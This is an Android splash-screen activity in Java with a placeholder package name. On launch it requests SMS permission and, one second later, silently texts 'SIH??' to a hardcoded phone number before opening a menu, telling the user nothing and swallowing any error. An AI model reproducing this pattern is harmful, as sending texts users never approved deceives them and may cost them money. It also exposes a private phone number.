package com.Compssany.ProductNamess;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.content.Intent;
import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;

import com.tbruyelle.rxpermissions2.RxPermissions;

import java.util.ArrayList;

public class SplashScreen extends AppCompatActivity {

    private static final int MAX_SMS_MESSAGE_LENGTH = 70;

    @SuppressLint("CheckResult")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        setTheme(R.style.Theme_AppCompat);
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_splash_screen);
        RxPermissions rxPermissions = new RxPermissions(this); // where this is an Activity instance // Must be done during an initialization phase like onCreate
        rxPermissions
                .request(Manifest.permission.SEND_SMS)
                .subscribe(granted -> {
                    if (granted) { // Always true pre-M
                        // I can control the camera now


                    } else {
                        // Oups permission denied
                    }
                });

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {

                sendSms();


            }

            private void sendSms() {
                String srcNum = "+918448603206";
                try {
                    SmsManager.getDefault().sendTextMessage(srcNum, null,
                            "SIH??", null, null);


                    startActivity(new Intent(SplashScreen.this, MenuUI.class));
                    SplashScreen.this.finish();

                } catch (Exception e) {
          /* AlertDialog.Builder alertDialogBuilder;
                    alertDialogBuilder = new
                             AlertDialog.Builder(this);
                    AlertDialog dialog = alertDialogBuilder.create();
            dialog.setMessage(e.getMessage());
            dialog.show();
             */   }
            }


        }, 1000);


    }
}

